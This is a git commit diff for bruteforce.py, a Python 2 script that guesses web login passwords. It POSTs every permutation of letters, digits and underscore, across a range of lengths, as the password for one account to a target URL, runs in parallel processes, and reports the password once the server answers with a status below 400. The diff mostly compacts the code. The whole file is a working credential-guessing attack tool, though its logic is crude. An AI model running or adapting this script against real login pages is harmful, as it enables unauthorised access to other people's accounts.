257b0bc583884db0d32c740b8ccc7afa3c649895
michael34435 <michael34435@gamil.com>
2014-05-07 21:21:13 +0800

    no message

--- bruteforce.py
+++ bruteforce.py
@@ -1,22 +1,10 @@
-import itertools
-import urllib
-import urllib2
-import sys
-import multiprocessing
-import os
-import signal
+import itertools, urllib, urllib2, sys, multiprocessing, os, signal
 
-def brute(n, m, url = '', form = 'account', form1 = 'password', account = ''):
-	for i in xrange(n,m+1):
-		res = itertools.permutations('0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_', i)
-		for n in res:
-			work(res, url, form, form1, account)
-		pass
-	pass
+def brute(i, url = '', form = 'account', form1 = 'password', account = ''):
+	work(itertools.permutations('0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_', i), url, form, form1, account)
 
 if __name__ == '__main__':
     jobs = []
-    
     try:
     	account = sys.argv[1]
     	n = int(sys.argv[2])
@@ -28,14 +16,12 @@ if __name__ == '__main__':
     	print 'Error... program is going to be exit...'
     	sys.exit()
     	pass
-
     try:
     	form = sys.argv[5]
     	pass
     except Exception, e:
     	form = 'account'
     	pass
-
     try:
     	form1 = sys.argv[6]
     	pass
@@ -44,7 +30,7 @@ if __name__ == '__main__':
     	pass
 
     for i in xrange(n,m+1):
-    	p = multiprocessing.Process(target=brute, args=(i,i,url,form,form1,account,))
+    	p = multiprocessing.Process(target=brute, args=(i,url,form,form1,account,))
         jobs.append(p)
         p.start()
 
@@ -58,15 +44,12 @@ def work(res, url, form, form1, account):
 # form => password filed
 def send(url, form, form1, account, password):
 	try: 
-		req = urllib2.Request(url, urllib.urlencode({form : account ,form1 : password}))
-		response = urllib2.urlopen(req)
-		if response.getcode() < 400:
-			print 'success! ...... password: ' + password
+		if urllib2.urlopen(urllib2.Request(url, urllib.urlencode({form : account ,form1 : password}))).getcode() < 400:
+			print 'success! ...... password: ' + str(password)
 			os.kill(signal.CTRL_C_EVENT, 1)
 			pass
 		pass
 	except Exception, e:
-		# print e
 		''
 	pass
 		
